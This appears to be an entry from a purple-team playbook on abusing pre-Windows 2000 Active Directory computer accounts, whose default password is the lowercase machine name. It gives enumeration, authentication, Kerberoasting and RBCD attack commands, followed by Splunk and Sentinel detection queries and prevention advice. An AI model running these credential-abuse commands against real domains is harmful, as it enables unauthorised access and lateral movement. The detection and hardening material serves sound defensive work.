name: Pre-Windows 2000 Computer Accounts - Known Password Exploitation
command: Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-1)} -Properties PasswordLastSet, OperatingSystem | Select Name, PasswordLastSet, OperatingSystem
description: Computer accounts created with "Assign this computer account as a pre-Windows 2000 computer" have their password set to the lowercase machine name (without the trailing $). These accounts can be used for authentication, Kerberoasting across trusts, and RBCD attacks. Shockingly common in legacy environments.
notes:
=== FIND PRE-2000 ACCOUNTS ===
  # PowerShell:
  Get-ADComputer -Filter {PasswordLastSet -lt (Get-Date).AddYears(-5)} -Properties PasswordLastSet | Select Name, PasswordLastSet
  # Or with userAccountControl flag:
  Get-ADComputer -Filter {userAccountControl -band 0x20} -Properties userAccountControl

=== DEFAULT PASSWORD ===
  # Pre-2000 computer accounts use lowercase machine name as password:
  # Machine: WORKSTATION01$ -> Password: workstation01
  # Machine: SERVER2$       -> Password: server2

=== AUTHENTICATE ===
  # From Linux:
  crackmapexec smb <dc_ip> -u WORKSTATION01$ -p workstation01
  getTGT.py <domain>/WORKSTATION01$:workstation01
  # From Windows:
  runas /netonly /user:<domain>\WORKSTATION01$ cmd.exe
  # (enter: workstation01 as password)

=== EXPLOITATION ===
  # Kerberoast with machine account:
  GetUserSPNs.py <domain>/WORKSTATION01$:workstation01 -dc-ip <dc_ip>
  # RBCD if machine has delegation rights:
  rbcd.py -delegate-to <target>$ -delegate-from WORKSTATION01$ -dc-ip <dc_ip> -action write <domain>/WORKSTATION01$:workstation01
  # Enum AD:
  ldapsearch -x -H ldap://<dc_ip> -D "WORKSTATION01$@<domain>" -w workstation01 -b "DC=<domain>,DC=local"

recommended.note: Machine account creation for RBCD chains; pre-2k accounts provide free machine creds.
Use pre-2k machine creds for RBCD delegation attacks.

defense.why_it_works: Pre-Windows 2000 computer accounts are created with a predictable password (lowercase machine name). If the password is never changed after joining the domain, the default credential remains valid.
defense.prerequisites: Pre-2000 computer accounts in the domain that never rotated their password.
defense.impact: Valid domain computer credentials for enumeration, Kerberoasting, and delegation attacks.
defense.detection: [MITRE T1078.002] Authentication from computer accounts with very old password timestamps; unusual logon patterns from machine accounts.
defense.artifacts: Event 4624 logon from machine accounts; Kerberos TGT requests from stale computer accounts.
defense.splunk_spl:
index=windows EventCode=4624 TargetUserName="*$"
| lookup ad_computers ComputerName as TargetUserName OUTPUT PasswordLastSet
| where PasswordLastSet < relative_time(now(), "-365d")
| table _time, TargetUserName, IpAddress, PasswordLastSet
defense.sentinel_kql:
SecurityEvent
| where EventID == 4624
| where TargetUserName endswith "$"
| join kind=inner (
  SecurityEvent | where EventID == 4741 or EventID == 4742
) on TargetUserName
defense.prevention: Audit and disable pre-2000 computer accounts; force machine password rotation; remove "Assign this computer account as a pre-Windows 2000 computer" from provisioning.

detections.name: Pre-2000 computer account authentication
detections.logic:
SecurityEvent
| where EventID == 4624
| where TargetUserName endswith "$"
| where LogonType in (3, 10)
| summarize LoginCount=count(), DistinctSources=dcount(IpAddress) by TargetUserName, bin(TimeGenerated, 1h)
| where LoginCount > 5 or DistinctSources > 2
detections.false_positives: Legitimate machine account authentication; service accounts using computer identities
detections.tuning: Cross-reference with AD computer password age; alert on accounts with passwords older than 90 days
